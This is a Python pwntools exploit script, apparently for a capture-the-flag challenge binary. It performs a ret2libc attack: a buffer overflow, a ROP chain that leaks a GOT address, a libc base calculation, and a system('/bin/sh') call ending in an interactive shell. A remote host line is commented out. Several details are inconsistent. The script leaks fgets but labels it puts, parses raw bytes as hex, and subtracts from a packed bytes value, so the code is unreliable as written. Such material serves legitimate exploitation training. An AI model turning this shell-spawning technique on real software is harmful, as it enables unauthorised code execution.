from pwn import *

context.binary = elf = ELF("./challenge")
libc = ELF("/lib32/libc.so.6", checksec=False)
p = process(aslr=True)
# p = remote("10.10.10.10", 1337)

rop = ROP(elf)
rop.puts(elf.got["fgets"])
rop.main()

OFFSET = 20  # Find using cyclic

payload = flat({OFFSET: [rop.chain()]})

p.sendlineafter(b"> ", payload)

p.recvlinesS(1)  # Some text printed before `ret` instruction
r = int(p.recvline().strip(), 16)  # Receive address of `puts()` as binary data

leak = p32(r, "little")
success("Leaked puts(): %#x", u32(leak))

libc.address = leak - libc.symbols["fgets"]
success("Libc base: %#x", libc.address)

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))
rop.exit()

payload = flat({OFFSET: [rop.chain()]})

p.sendline(payload)

p.interactive()
